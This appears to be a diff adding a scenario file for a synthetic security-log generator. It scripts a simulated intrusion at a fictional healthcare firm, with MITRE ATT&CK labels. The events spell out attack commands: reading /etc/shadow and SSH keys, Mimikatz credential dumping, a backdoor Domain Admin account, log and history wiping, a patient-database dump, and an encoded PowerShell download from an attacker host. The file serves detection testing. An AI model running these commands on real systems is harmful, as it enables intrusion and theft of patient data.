+        technique: "T1016 - System Network Configuration Discovery"
+        description: "Read resolver configuration"
+      - type: process
+        process_name: "/usr/bin/find"
+        command_line: "find /opt/ehr -name '*credential*' -maxdepth 3"
+        technique: "T1083 - File and Directory Discovery"
+        description: "Fumble: first discovery command finds nothing useful"
+      - type: process
+        process_name: "/usr/bin/nmap"
+        command_line: "nmap -sn 10.10.2.0/24"
+        technique: "T1046 - Network Service Discovery"
+        description: "Ping sweep of server VLAN"
+      - type: process
+        process_name: "/usr/bin/nmap"
+        command_line: "nmap -sT -p 22,80,443,445,3306 10.10.2.0/24"
+        technique: "T1046 - Network Service Discovery"
+        description: "TCP port scan of server VLAN"
+
+  - id: evt-email-006
+    time: "+1h50m"
+    actor: priya.patel
+    system: WS-PPATEL-01
+    activity: "A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment"
+    events:
+      - type: email_message
+        sender: workspace@docflow-health.net
+        to: [priya.patel@meridianhcs.com]
+        corpus_id: docflow-ai-summary
+        artifact_id: docflow-ai-summary-msg
+        verdict: suspicious
+        mail_action: deliver
+        outcome: delivered
+        technique: "T1566.001 - Phishing: Spearphishing Attachment"
+        description: "Inbound service-generated message with AI prompt-injection text in MIME content"
+
+  - id: evt-email-007
+    time: "+1h56m"
+    actor: lina.nguyen
+    system: WS-LNGUYEN-01
+    activity: "Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay"
+    events:
+      - type: email_message
+        to: [miles.avery@stonebridge-consultingllc.com]
+        cc: [omar.haddad@meridianhcs.com]
+        corpus_id: vendor-interface-package
+        artifact_id: vendor-interface-package-msg
+        verdict: clean
+        mail_action: deliver
+        outcome: delivered
+        technique: "Benign - Vendor Collaboration"
+        description: "Outbound mail with attachments, internal Cc, clinical relay, edge relay, and ISP smart host"
+
+  - id: evt-007
+    time: "+2h"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Harvest database credentials and SSH key material from the web server"
+    events:
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /var/www/html/config.php"
+        technique: "T1552.001 - Unsecured Credentials: Credentials In Files"
+        description: "Read EHR application database credentials"
+      - type: process
+        process_name: "/usr/bin/ls"
+        command_line: "ls -la /root/.ssh"
+        technique: "T1083 - File and Directory Discovery"
+        description: "List root SSH key directory"
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /root/.ssh/id_rsa"
+        technique: "T1552.004 - Unsecured Credentials: Private Keys"
+        description: "Read private SSH key"
+
+  - id: evt-008
+    time: "+2h15m"
+    actor: root
+    system: APP-INT-01
+    activity: "Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01"
+    events:
+      - type: connection
+        source_ip: "10.10.3.10"
+        dst_ip: "10.10.3.20"
+        dst_port: 22
+        service: ssh
+        conn_state: REJ
+        technique: "T1021.004 - Remote Services: SSH"
+        description: "Fumble: attempted SSH to proxy host is refused"
+      - type: ssh_session
+        source_ip: "10.10.3.10"
+        ids_alerts:
+          - sid: 2002911
+            policy:
+              event_filter:
+                type: limit
+                track: by_src
+                count: 1
+                seconds: 60
+        technique: "T1021.004 - Remote Services: SSH"
+        description: "Successful SSH lateral movement using stolen key"
+
+  - id: evt-009
+    time: "+2h35m"
+    actor: root
+    system: APP-INT-01
+    activity: "Dump Linux password databases from APP-INT-01"
+    events:
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /etc/passwd"
+        technique: "T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow"
+        description: "Dump /etc/passwd"
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /etc/shadow"
+        technique: "T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow"
+        description: "Dump /etc/shadow"
+
+  - id: evt-010
+    time: "+2h50m"
+    actor: marcus.chen
+    system: WS-MCHEN-01
+    activity: "Attacker uses explicit sysadmin credentials through RunAs"
+    events:
+      - type: explicit_credentials
+        target_username: marcus.chen
+        target_server: DC-01
+        process_name: "C:\\Windows\\System32\\runas.exe"
+        source_ip: "10.10.1.99"
+        technique: "T1078 - Valid Accounts"
+        description: "Explicit use of compromised sysadmin credentials"
+
+  - id: evt-011
+    time: "+2h59m"
+    actor: root
+    system: LT-MRIVERA-02
+    activity: "Wrong-password fumble before broader credential spray"
+    events:
+      - type: failed_logon
+        source_ip: "10.10.1.99"
+        logon_type: 3
+        target_username: aisha.johnson
+        technique: "T1110 - Brute Force"
+        description: "Fumble: one wrong password before spray"
+
+  - id: evt-012
+    time: "+3h"
+    actor: root
+    system: WS-AJOHNSON-01
+    activity: "Credential spray succeeds against help desk user followed by RDP session"
+    events:
+      - type: credential_spray
+        source_ip: "10.10.1.99"
+        pattern: spray
+        target_accounts: ["aisha.johnson", "diego.ramirez", "sophia.martinez"]
+        success:
+          account: aisha.johnson
+          after: 3
+        interval: "5s"
+        count: 10
+        logon_type: 3
+        technique: "T1110.003 - Brute Force: Password Spraying"
+        description: "Password spray against domain users"
+      - type: rdp_session
+        source_ip: "10.10.1.99"
+        technique: "T1021.001 - Remote Services: Remote Desktop Protocol"
+        description: "Successful RDP into help desk workstation"
+
+  - id: evt-email-008
+    time: "+3h08m"
+    actor: aisha.johnson
+    system: WS-AJOHNSON-01
+    activity: "Compromised help desk mailbox sends an internal credential-reset lure to finance"
+    events:
+      - type: email_message
+        to: [finance@meridianhcs.com]
+        cc: [marcus.chen@meridianhcs.com]
+        corpus_id: internal-reset-lure
+        artifact_id: internal-reset-lure-msg
+        user_agent: "Microsoft Outlook 16.0"
+        verdict: phishing
+        mail_action: deliver
+        outcome: delivered
+        technique: "T1566.002 - Phishing: Spearphishing Link"
+        description: "Internal phishing email sent from a compromised help desk account"
+
+  - id: evt-email-009
+    time: "+3h14m"
+    actor: aisha.johnson
+    system: WS-AJOHNSON-01
+    activity: "Attacker reads the compromised help desk mailbox through IMAPS"
+    events:
+      - type: email_read
+        mailbox: aisha.johnson@meridianhcs.com
+        server: edge
+        protocol: imaps
+        message_ids: [finance-forward-to-it-msg, internal-reset-lure-msg]
+        count: 7
+        duration: 132.0
+        user_agent: "Microsoft Outlook 16.0"
+        technique: "T1114.002 - Email Collection: Remote Email Collection"
+        description: "Opaque mailbox-read session from the compromised help desk workstation"
+
+  - id: evt-013
+    time: "+3h20m"
+    actor: aisha.johnson
+    system: WS-AJOHNSON-01
+    activity: "Active Directory enumeration from compromised workstation"
+    events:
+      - type: logon
+        logon_type: 10
+        source_ip: "10.10.1.99"
+        technique: "T1021.001 - Remote Services: Remote Desktop Protocol"
+        description: "Established RDP session context for follow-on commands"
+      - type: process
+        process_name: "C:\\Windows\\System32\\whoami.exe"
+        command_line: "whoami /all"
+        technique: "T1033 - System Owner/User Discovery"
+        description: "Enumerate current user token"
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net user /domain"
+        technique: "T1087.002 - Account Discovery: Domain Account"
+        description: "Enumerate domain users"
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net group \"Domain Admins\" /domain"
+        technique: "T1069.002 - Permission Groups Discovery: Domain Groups"
+        description: "Enumerate domain admin group"
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net view /domain"
+        technique: "T1135 - Network Share Discovery"
+        description: "Enumerate domain shares"
+      - type: dns_query
+        query: "DC-01.meridianhcs.local"
+        qtype: A
+        rcode: NOERROR
+        answer: "10.10.2.10"
+        technique: "T1018 - Remote System Discovery"
+        description: "Resolve DC hostname"
+      - type: connection
+        dst_ip: "10.10.2.10"
+        dst_port: 389
+        service: ldap
+        technique: "T1018 - Remote System Discovery"
+        description: "LDAP connection to domain controller"
+
+  - id: evt-014
+    time: "+3h45m"
+    actor: aisha.johnson
+    system: WS-AJOHNSON-01
+    activity: "Credential dumping with Mimikatz disguised as a Windows indexing service"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\ms-index-service.exe"
+        command_line: "ms-index-service.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
+        technique: "T1003.001 - OS Credential Dumping: LSASS Memory"
+        description: "Mimikatz renamed as service-looking binary"
+      - type: process_access
+        target_process: "winlogon.exe"
+        access_mask: "0x1010"
+        technique: "T1055 - Process Injection"
+        description: "Standalone benign-looking process access coverage separate from LSASS injection"
+      - type: create_remote_thread
+        target_process: "lsass.exe"
+        technique: "T1055 - Process Injection"
+        description: "Remote thread injection into LSASS; causal expansion adds process access"
+
+  - id: evt-015
+    time: "+4h"
+    actor: aisha.johnson
+    system: DC-01
+    activity: "PsExec-style lateral movement to DC-01 through SMB service creation"
+    events:
+      - type: logon
+        logon_type: 3
+        source_ip: "10.10.1.35"
+        technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"
+        description: "Network logon to DC for PsExec"
+      - type: service_installed
+        service_name: "PSEXESVC"
+        service_file_name: "%SystemRoot%\\PSEXESVC.exe"
+        service_account: "LocalSystem"
+        technique: "T1569.002 - System Services: Service Execution"
+        description: "Temporary PsExec service installed"
+      - type: process
+        process_name: "C:\\Windows\\System32\\PSEXESVC.exe"
+        command_line: "PSEXESVC.exe -accepteula"
+        technique: "T1569.002 - System Services: Service Execution"
+        description: "PsExec service process starts on DC"
+      - type: process
+        process_name: "C:\\Windows\\System32\\cmd.exe"
+        command_line: "cmd.exe /c whoami && hostname"
+        technique: "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+        description: "Command executed through PsExec service"
+
+  - id: evt-email-010
+    time: "+4h07m"
+    actor: evelyn.brooks
+    system: WS-EBROOKS-01
+    activity: "External invoice-themed attachment is rejected by the mail gateway"
+    events:
+      - type: email_message
+        sender: billing@medclaims-processing.net
+        to: [evelyn.brooks@meridianhcs.com]
+        corpus_id: blocked-invoice
+        artifact_id: blocked-invoice-msg
+        verdict: malware
+        mail_action: reject
+        outcome: rejected
+        technique: "T1566.001 - Phishing: Spearphishing Attachment"
+        description: "Rejected inbound SMTP message with malicious-looking attachment metadata"
+
+  - id: evt-016
+    time: "+4h15m"
+    actor: SYSTEM
+    system: DC-01
+    activity: "Create backdoor account and add it to Domain Admins"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net user svc_mhsync MhsSvc!2024 /add /domain"
+        supplementary: none
+        technique: "T1136.002 - Create Account: Domain Account"
+        description: "Create backdoor domain account"
+      - type: account_created
+        target_username: svc_mhsync
+        technique: "T1136.002 - Create Account: Domain Account"
+        description: "Domain account svc_mhsync created"
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net group \"Domain Admins\" svc_mhsync /add /domain"
+        supplementary: none
+        technique: "T1098 - Account Manipulation"
+        description: "Add backdoor account to privileged group"
+      - type: group_member_added
+        group_name: "Domain Admins"
+        member_name: svc_mhsync
+        scope: global
+        technique: "T1098 - Account Manipulation"
+        description: "svc_mhsync added to Domain Admins"
+
+  - id: evt-017
+    time: "+4h20m"
+    actor: SYSTEM
+    system: DC-01
+    activity: "Install service and scheduled task persistence on DC-01"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\sc.exe"
+        command_line: "sc.exe create DeviceSyncSvc binPath= C:\\Windows\\System32\\DeviceSyncSvc.exe obj= LocalSystem start= auto"
+        supplementary: none
+        technique: "T1543.003 - Create or Modify System Process: Windows Service"
+        description: "Create persistence service"
+      - type: service_installed
+        service_name: "DeviceSyncSvc"
+        service_file_name: "C:\\Windows\\System32\\DeviceSyncSvc.exe"
+        service_account: "LocalSystem"
+        technique: "T1543.003 - Create or Modify System Process: Windows Service"
+        description: "DeviceSyncSvc installed"
+      - type: process
+        process_name: "C:\\Windows\\System32\\schtasks.exe"
+        command_line: "schtasks.exe /Create /TN \"\\Microsoft\\Windows\\Maintenance\\DeviceSync\" /SC HOURLY /TR \"C:\\Windows\\System32\\DeviceSyncSvc.exe\" /RU SYSTEM"
+        supplementary: none
+        technique: "T1053.005 - Scheduled Task/Job: Scheduled Task"
+        description: "Create scheduled task persistence"
+      - type: scheduled_task_created
+        task_name: "\\Microsoft\\Windows\\Maintenance\\DeviceSync"
+        task_content: "<Task><Actions><Exec><Command>C:\\Windows\\System32\\DeviceSyncSvc.exe</Command></Exec></Actions></Task>"
+        technique: "T1053.005 - Scheduled Task/Job: Scheduled Task"
+        description: "Scheduled task created"
+
+  - id: evt-018
+    time: "+4h30m"
+    actor: SYSTEM
+    system: DC-01
+    activity: "Allowed HTTPS beacon from DC-01 to attacker infrastructure"
+    events:
+      - type: beacon
+        dst_ip: "45.33.32.30"
+        dst_port: 443
+        hostname: "api.westbridge-services.net"
+        service: http
+        interval: "10m"
+        duration: "1h30m"
+        jitter: 0.3
+        method: GET
+        uri: "/api/v2/checkin"
+        status_code: 200
+        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36"
+        orig_bytes: 512
+        resp_bytes: 2048
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+        description: "Periodic HTTPS beacon through allowed path"
+
+  - id: evt-019
+    time: "+4h31m"
+    actor: SYSTEM
+    system: DC-01
+    activity: "Direct C2 beacon attempts from DC-01 are blocked by firewall"
+    events:
+      - type: beacon
+        dst_ip: "45.33.32.30"
+        dst_port: 443
+        interval: "30m"
+        duration: "1h30m"
+        jitter: 0.2
+        action: deny
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+        description: "Denied direct-IP beacon attempts"
+
+  - id: evt-020
+    time: "+4h45m"
+    actor: root
+    system: APP-INT-01
+    activity: "DNS tunneling exfiltration from APP-INT-01"
+    events:
+      - type: dns_tunnel
+        base_domain: "ns1.westbridge-services.cloud"
+        encoding: hex
+        qtype: TXT
+        interval: "2s"
+        duration: "15m"
+        payload_size: 512
+        ids_alerts:
+          - sid: 2029706
+            policy:
+              detection_filter:
+                track: by_src
+                count: 10
+                seconds: 60
+              event_filter:
+                type: limit
+                track: by_src
+                count: 2
+                seconds: 300
+        technique: "T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol"
+        description: "Encoded DNS TXT tunnel from app server"
+
+  - id: evt-email-011
+    time: "+4h50m"
+    actor: evelyn.brooks
+    system: WS-EBROOKS-01
+    activity: "Executive sends an inline-authored operating note to an outside advisor with internal Bcc"
+    events:
+      - type: email_message
+        to: [marina.holt@northbridge-advisory.com]
+        cc: [diego.ramirez@meridianhcs.com]
+        bcc: [priya.patel@meridianhcs.com]
+        subject: "March operating note"
+        body: |
+          Marina,
+
+          Sharing the short operating note ahead of Thursday's call. The claims-interface
+          forecast is still marked draft, but the facilities and staffing numbers are final
+          as of this afternoon.
+
+          Evelyn
+        artifact_id: executive-operating-note-msg
+        user_agent: "Microsoft Outlook 16.0"
+        verdict: clean
+        mail_action: deliver
+        outcome: delivered
+        attachments:
+          - filename: "operating-note-march.txt"
+            content_type: "text/plain"
+            content: |
+              Meridian Healthcare Solutions operating note
+              Claims interface forecast: draft
+              Staffing plan: approved
+              Facilities budget: final
+        technique: "Benign - Executive Communication"
+        description: "Inline email body and attachment with outbound smart-host routing"
+
+  - id: evt-021
+    time: "+5h"
+    actor: root
+    system: WEB-EXT-01
+    activity: "DGA queries from compromised web server"
+    events:
+      - type: dga_queries
+        tld: ".top"
+        length_range: [10, 18]
+        interval: "30s"
+        duration: "45m"
+        rcode_distribution:
+          NXDOMAIN: 0.92
+          NOERROR: 0.08
+        answer_ip: "45.33.32.30"
+        seed: 4242
+        ids_alerts:
+          - sid: 2027865
+            policy:
+              detection_filter:
+                track: by_src
+                count: 2
+                seconds: 120
+              event_filter:
+                type: both
+                track: by_src
+                count: 1
+                seconds: 300
+        technique: "T1568.002 - Dynamic Resolution: Domain Generation Algorithms"
+        description: "DGA-style DNS lookups"
+
+  - id: evt-022
+    time: "+4h58m"
+    actor: aisha.johnson
+    system: WS-AJOHNSON-01
+    activity: "Attacker tests the compromised help desk identity against the Finance share"
+    events:
+      - type: smb_activity
+        operation: read
+        purpose: collection
+        target:
+          type: share
+          share: FILE-SRV-01.finance
+          file_ref: q1_forecast
+        outcome: access_denied
+        path_style: unc
+        technique: "T1039 - Data from Network Shared Drive"
+        description: "Denied attempt to read a Finance workbook as the help desk user"
+
+  - id: evt-022b
+    time: "+5h01m"
+    actor: marcus.chen
+    system: WS-AJOHNSON-01
+    activity: "Attacker uses stolen administrator credentials to collect Finance and clinical exports over SMB"
+    event_spacing:
+      mode: explicit_offsets
+      offsets: ["0s", "10s", "11s", "12s", "14s", "20s"]
+    events:
+      - type: logon
+        logon_type: 9
+        source_ip: "10.10.1.35"
+        technique: "T1078.002 - Valid Accounts: Domain Accounts"
+        description: "Create a new-credentials session for the stolen administrator identity"
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -NoProfile -Command \"New-Item -ItemType Directory -Force C:\\ProgramData\\Microsoft\\VaultCache\\Finance,C:\\ProgramData\\Microsoft\\VaultCache\\Clinical | Out-Null\""
+        supplementary: none
+        technique: "T1059.001 - Command and Scripting Interpreter: PowerShell"
+        description: "Prepare local collection directories under the stolen administrator session"
+      - type: smb_activity
+        operation: browse
+        purpose: collection
+        target:
+          type: share
+          share: FILE-SRV-01.finance
+          file_ref: q1_forecast
+        outcome: success
+        path_style: unc
+        technique: "T1135 - Network Share Discovery"
+        description: "Enumerate Finance content with stolen administrator credentials"
+      - type: smb_activity
+        operation: copy
+        purpose: collection
+        source:
+          type: share
+          share: FILE-SRV-01.finance
+          selector:
+            path_glob: 'Q1\**\*'
+            extensions: [.xlsx, .docx, .pdf]
+            tags_any: [finance]
+        destination:
+          type: client
+          path: 'C:\ProgramData\Microsoft\VaultCache\Finance\'
+        batch:
+          count: 5
+          duration: "2s"
+        outcome: success
+        path_style: unc
+        technique: "T1039 - Data from Network Shared Drive"
+        description: "Copy a bounded Finance working set to local staging"
+      - type: smb_activity
+        operation: copy
+        purpose: collection
+        source:
+          type: share
+          share: FILE-SRV-01.clinical-exports
+          file_ref: deidentified_claims
+        destination:
+          type: client
+          path: 'C:\ProgramData\Microsoft\VaultCache\Clinical\deidentified-claims-sample.csv'
+        outcome: success
+        path_style: unc
+        technique: "T1039 - Data from Network Shared Drive"
+        description: "Copy a clinical export from an encrypted share to local staging"
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -NoProfile -Command \"Compress-Archive -Path C:\\ProgramData\\Microsoft\\VaultCache\\Finance\\*,C:\\ProgramData\\Microsoft\\VaultCache\\Clinical\\* -DestinationPath C:\\ProgramData\\Microsoft\\cache_7f3a.zip\""
+        technique: "T1560.001 - Archive Collected Data: Archive via Utility"
+        description: "Compress locally staged Finance and clinical data"
+
+  - id: evt-023
+    time: "+5h15m"
+    actor: root
+    system: DB-PROD-01
+    activity: "SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01"
+    events:
+      - type: ssh_session
+        source_ip: "10.10.2.30"
+        technique: "T1021.004 - Remote Services: SSH"
+        description: "SSH from app server to database server"
+      - type: process
+        process_name: "/usr/bin/mysqldump"
+        command_line: "mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql"
+        technique: "T1005 - Data from Local System"
+        description: "Dump patient and insurance tables"
+      - type: process
+        process_name: "/usr/bin/gzip"
+        command_line: "gzip -9 /tmp/rpt_0318.sql"
+        technique: "T1560.001 - Archive Collected Data: Archive via Utility"
+        description: "Compress database dump"
+      - type: process
+        process_name: "/usr/bin/scp"
+        command_line: "scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz"
+        technique: "T1105 - Ingress Tool Transfer"
+        description: "Copy archive back to app server"
+
+  - id: evt-024
+    time: "+5h20m"
+    actor: aisha.johnson
+    system: WS-AJOHNSON-01
+    activity: "Attacker locks compromised workstation before stepping away"
+    events:
+      - type: workstation_lock
+        technique: "T1078 - Valid Accounts"
+        description: "Compromised workstation locked"
+
+  - id: evt-025
+    time: "+5h25m"
+    actor: aisha.johnson
+    system: WS-AJOHNSON-01
+    activity: "Upload compressed archive to external staging domain over HTTPS"
+    events:
+      - type: connection
+        dst_ip: "45.33.32.30"
+        dst_port: 443
+        hostname: "api.westbridge-services.net"
+        service: http
+        method: POST
+        uri: "/upload/telemetry/7f3a2b19"
+        status_code: 200
+        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36"
+        orig_bytes: 314782613
+        resp_bytes: 2048
+        technique: "T1041 - Exfiltration Over C2 Channel"
+        description: "Upload staged archive"
+
+  - id: evt-026
+    time: "+5h30m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Ongoing periodic beacon from WEB-EXT-01"
+    events:
+      - type: beacon
+        dst_ip: "45.33.32.30"
+        dst_port: 443
+        hostname: "api.westbridge-services.net"
+        service: http
+        interval: "10m"
+        count: 3
+        jitter: 0.25
+        method: GET
+        uri: "/assets/status"
+        status_code: 200
+        orig_bytes: 420
+        resp_bytes: 1337
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+        description: "Ongoing web server C2 beacon"
+
+  - id: evt-027
+    time: "+5h35m"
+    actor: aisha.johnson
+    system: WS-AJOHNSON-01
+    activity: "Attacker returns and unlocks compromised workstation"
+    events:
+      - type: workstation_unlock
+        technique: "T1078 - Valid Accounts"
+        description: "Compromised workstation unlocked"
+
+  - id: evt-028
+    time: "+5h40m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Clear Linux shell history on WEB-EXT-01"
+    events:
+      - type: process
+        process_name: "/usr/bin/shred"
+        command_line: "shred -u /root/.bash_history"
+        technique: "T1070.003 - Indicator Removal: Clear Command History"
+        description: "Clear root bash history"
+
+  - id: evt-029
+    time: "+5h41m"
+    actor: root
+    system: APP-INT-01
+    activity: "Clear Linux shell history on APP-INT-01"
+    events:
+      - type: process
+        process_name: "/bin/bash"
+        command_line: "history -c && cat /dev/null > ~/.bash_history"
+        technique: "T1070.003 - Indicator Removal: Clear Command History"
+        description: "Clear app server shell history"
+
+  - id: evt-030
+    time: "+5h42m"
+    actor: SYSTEM
+    system: DC-01
+    activity: "Encoded PowerShell download and Security log clearing on DC-01"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA"
+        technique: "T1059.001 - Command and Scripting Interpreter: PowerShell"
+        description: "UTF-16LE base64 encoded PowerShell download"
+      - type: process
+        process_name: "C:\\Windows\\System32\\wevtutil.exe"
+        command_line: "wevtutil cl Security"
+        supplementary: none
+        technique: "T1070.001 - Indicator Removal: Clear Windows Event Logs"
+        description: "Clear Windows Security log"
+      - type: log_cleared
+        technique: "T1070.001 - Indicator Removal: Clear Windows Event Logs"
+        description: "Security event log cleared"
+
+  - id: evt-031
+    time: "+5h45m"
+    actor: root
+    system: APP-INT-01
+    activity: "Standalone DNS queries for attacker infrastructure"
+    events:
+      - type: dns_query
+        query: "edge.westbridge-services.net"
+        qtype: A
+        rcode: NOERROR
+        answer: "45.33.32.30"
+        technique: "T1071.004 - Application Layer Protocol: DNS"
+        description: "Resolve staging domain"
+      - type: dns_query
+        query: "api.westbridge-services.net"
+        qtype: A
+        rcode: NOERROR
+        answer: "45.33.32.30"
+        technique: "T1071.004 - Application Layer Protocol: DNS"
+        description: "Resolve DNS tunnel support host"
+      - type: dns_query
+        query: "metrics.westbridge-services.net"
+        qtype: TXT
+        rcode: NXDOMAIN
+        technique: "T1071.004 - Application Layer Protocol: DNS"
+        description: "Failed TXT lookup for attacker infrastructure"
+
+  - id: evt-032
+    time: "+5h50m"
+    actor: SYSTEM
+    system: DC-01
+    activity: "Delete backdoor account after exfiltration"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net user svc_mhsync /delete /domain"
+        supplementary: none
+        technique: "T1531 - Account Access Removal"
+        description: "Delete backdoor domain account"
+      - type: account_deleted
+        target_username: svc_mhsync
+        technique: "T1531 - Account Access Removal"
+        description: "Backdoor domain account deleted"
+
+  - id: evt-033
+    time: "+5h55m"
+    actor: aisha.johnson
+    system: WS-AJOHNSON-01
+    activity: "Attacker logs off compromised help desk workstation"
+    events:
+      - type: logoff
+        technique: "T1078 - Valid Accounts"
+        description: "Logoff from compromised workstation"
+
+  - id: evt-035
+    time: "+5h57m"
+    actor: root
+    system: APP-INT-01
+    activity: "Root SSH session logs off APP-INT-01"
+    events:
+      - type: logoff
+        technique: "T1021.004 - Remote Services: SSH"
+        description: "Logoff from app server"
+
+output:
+  logs:
+    - format: windows
+    - format: zeek
+    - format: ecar
+    - format: syslog
+    - format: bash_history
+    - format: snort_alert
+    - format: cisco_asa
+    - format: web_access
+    - format: proxy_access
+  destination: scenarios/iteration-test-1_0
+  compression: false
